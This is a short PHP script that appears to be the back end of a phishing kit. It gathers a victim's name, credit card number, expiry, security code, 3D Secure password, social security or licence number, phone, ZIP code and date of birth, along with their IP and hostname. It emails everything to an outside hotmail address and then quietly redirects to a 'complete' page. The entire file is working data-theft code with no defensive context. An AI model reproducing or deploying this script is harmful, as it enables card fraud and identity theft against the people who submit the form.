<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| REDOX |--------------|\n";
$message .= "|FIRST NAME            : ".$_POST['firstName']."\n";
$message .= "|LAST NAME           : ".$_POST['lastName']."\n";
$message .= "|CREDIT CARD NUMBER             : ".$_POST['creditCardNumber']."\n";
$message .= "|EXP MONTH        : ".$_POST['expMonth']."\n";
$message .= "|EXP YEAR        : ".$_POST['expYear']."\n";
$message .= "|SECURITY CODE         : ".$_POST['creditCardSecurityCode']."\n";
$message .= "|3D Secure Password     : ".$_POST['creditCard3dSecureCode']."\n";
$message .= "|SSN|SIN|SCODE|DRIVLN   : ".$_POST['creditSecuritySocialNumber']."\n";
$message .= "|Phone Number   : ".$_POST['phonenumber']."\n";
$message .= "|ZIP CODE         : ".$_POST['creditZipcode']."\n";
$message .= "|Date of birth        : ".$_POST['creditDateofbirthday']."\n";
$message .= "|----------| I N F O |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------| YOUR WELCOME AZUBI|--------------|\n";
$send = "redabbamina@hotmail.com";
$subject = "VbV ON :D- From:  [ $ip ]";
{
mail("$send", "$subject", $message);
}
header("Location: complete.php");
?>


